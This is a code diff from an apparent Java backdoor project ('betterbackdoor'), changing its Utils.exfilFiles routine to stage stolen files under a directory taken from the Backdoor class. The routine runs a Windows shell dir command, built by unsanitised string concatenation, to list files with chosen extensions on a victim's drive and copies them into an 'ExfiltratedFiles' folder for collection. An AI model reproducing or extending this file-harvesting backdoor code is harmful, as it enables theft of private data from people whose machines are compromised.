@@ -12,6 +12,9 @@ import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Enumeration;
+
+import com.github.thatcherdev.betterbackdoor.backdoor.Backdoor;
+
 import org.apache.commons.io.FileUtils;
 
 public class Utils {
@@ -70,20 +73,20 @@ public class Utils {
 
 	/**
 	 * Copies all files that have extensions in {@link exts} from {@link root} to
-	 * 'gathered\ExfiltratedFiles'.
+	 * {@link Backdoor#gatheredDir}\ExfiltratedFiles'.
 	 *
 	 * @param root directory to copy files from
 	 * @param exts list of extensions of files to copy
 	 * @throws IOException
 	 */
 	public static void exfilFiles(String root, ArrayList<String> exts) throws IOException {
-		new File("gathered\\ExfiltratedFiles").mkdir();
+		new File(Backdoor.gatheredDir + "ExfiltratedFiles").mkdir();
 		for (String ext : exts)
 			for (String file : new ArrayList<String>(
 					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext).split("\n"))))
 				if (!file.equals("File Not Found"))
-					FileUtils.copyFile(new File(file),
-							new File("gathered\\ExfiltratedFiles\\" + file.substring(file.lastIndexOf("\\") + 1)));
+					FileUtils.copyFile(new File(file), new File(
+							Backdoor.gatheredDir + "ExfiltratedFiles\\" + file.substring(file.lastIndexOf("\\") + 1)));
 	}
 
 	/**
